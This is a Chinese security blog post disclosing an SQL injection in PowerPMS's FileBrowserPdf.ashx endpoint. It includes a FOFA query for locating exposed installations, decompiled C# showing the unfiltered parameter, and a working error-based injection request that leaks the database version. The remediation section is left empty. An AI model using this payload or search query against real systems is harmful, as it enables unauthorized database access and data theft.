---
title: "普华Powerpms FileBrowserPdf.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html
asset_dir: assets/普华powerpms-filebrowserpdf.ashx-sql注入漏洞
---

# 普华Powerpms FileBrowserPdf.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/23 08:16
* 1012浏览
* [0评论](#comment)
* 14分钟阅读

深入探索

数据库

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

普华PowerPMS是上海普华科技发展股份有限公司旗下一款项目管理信息平台。其PowerPMS系统FileBrowserPdf.ashx接口存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="普华科技-PowerPMS" || body="Power.login.init" && body="Power.ui.warning" && body="Power\_login\_btn"

# 漏洞分析

看下FileBrowserPdf.ashx的实现逻辑

```
public class FileBrowserPdf : IHttpHandler
{
  public void ProcessRequest(HttpContext context)
  {
    string fileId = RequestHelper.GetString("_fileid");
    if (!string.op_Inequality(RequestHelper.GetString("istest"), "1") || string.IsNullOrEmpty(fileId))
      return;
    BrowserPdfCahe.BrowserPdf(context, fileId, true);
  }
```

当 \_fileid 参数不为空时，进入BrowserPdfCahe.BrowserPdf

代码安全审计

```
public static void BrowserPdf(HttpContext context, string fileId, bool IsFragmentation)
{
  ViewResultModel viewResultModel = ViewResultModel.Create(true, "");
  try
  {
    bool flag = true;
    string libCfg = EntityFilesLibHelper.GetLibCfg(EntityFilesLibHelper.GetLibIdByCode(context, "FormMess"), "ToPdfPath");
    if (!string.op_Inequality(libCfg, ""))
      return;
    IBaseBusiness byKey = BusinessFactory.CreateBusinessOperate("DocFile").FindByKey((object) fileId);
```

使用FindByKey来查找，这个属于老熟人了。使用FindByKey查找，无过滤或校验，因此造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，就是朴实无华。

# 漏洞复现

```
POST /PowerPlat/Control/FileBrowserPdf.ashx HTTP/1.1
Host: powerpms.mrxn.net

_fileid=1'and 1<@@VERSION--
```

[![普华Powerpms FileBrowserPdf.ashx SQL注入漏洞](images/img-001-c0189a62995d.webp)](https://image.mrxn.net/2dbe8e11a69e4094aee6ec7d530210db.webp)

通过报错注入成功在响应回显数据库版本信息

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[普华Powerpms FileBrowserPdf.ashx SQL注入漏洞](https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html)  
文章链接：<https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-Control-FileBrowserPdf-sqli-2.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
